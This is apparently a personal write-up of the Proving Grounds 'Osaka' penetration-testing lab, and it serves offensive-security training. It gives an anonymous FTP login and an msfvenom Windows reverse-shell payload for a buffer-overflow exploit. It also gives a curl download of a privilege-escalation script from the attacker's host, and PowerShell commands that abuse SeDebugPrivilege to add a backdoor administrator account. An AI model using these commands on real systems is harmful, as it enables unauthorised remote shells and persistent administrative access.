---
title: Osaka
date: 2026-02-02T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - ftp
  - proving-grounds
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Osaka"
---


nmap -p- 192.168.116.20 --min-rate 5000 -o nmap.txt`

![](Screenshot%202026-01-20%20at%2012.26.17.png)

`ftp anonymous@192.168.116.20`

password:osaka

![](Screenshot%202026-01-20%20at%2012.25.08.png)

This ftp.exe binary will need to be examined with ghidra. 

![](Screenshot%202026-01-30%20at%2019.48.11.png)

I had to find a guide for this: https://routezero.security/2024/11/29/proving-grounds-practice-osaka-walkthrough/

The script in the guide will give you the offset and uses DEBUG for the exploit. You will need to update the payload with your IP and listener port:

`msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=1234 -f python -v sc`

Paste the output into the exploit.py file:

![](Screenshot%202026-02-03%20at%2008.03.38.png)

Change the IP to the victim machines IP: 

![](Screenshot%202026-02-03%20at%2008.04.27.png)

Start the listener:

![](Screenshot%202026-02-02%20at%2011.16.33.png)

Then run the exploit, this it what is should look like:

![](Screenshot%202026-02-03%20at%2015.33.09.png)

Enumeration:

	`whoami /priv`

This is what we're looking for, SeDebugPrivilege enables us to use a process with elevated privileges to start another process. 

![](Screenshot%202026-02-03%20at%2007.13.35.png)

We'll need a process ID that has system level privileges
	 `tasklisk`
 ![](Screenshot%202026-02-03%20at%2015.22.18.png)

Download this script onto kali and copy it to the victim machine:

`https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1`

`curl http://192.168.45.155:81/psgetsys.ps1 -o psgetsys.ps1`

Now add a user:

`powershell -c ". .\psgetsys.ps1; ImpersonateFromParentPid -ppid 556 -command 'C:\Windows\System32\net.exe' -cmdargs 'user offsec Start123! /add'"`

Add the new user the the Administrators group:

`powershell -c ". .\psgetsys.ps1; ImpersonateFromParentPid -ppid 556 -command 'C:\Windows\System32\net.exe' -cmdargs 'localgroup Administrators offsec /add'"`

Start the machine:

`xfreerdp3 /u:offsec /p:Start123! /v:192.168.140.20`

![](Screenshot%202026-02-03%20at%2006.53.45.png)

12 hours :(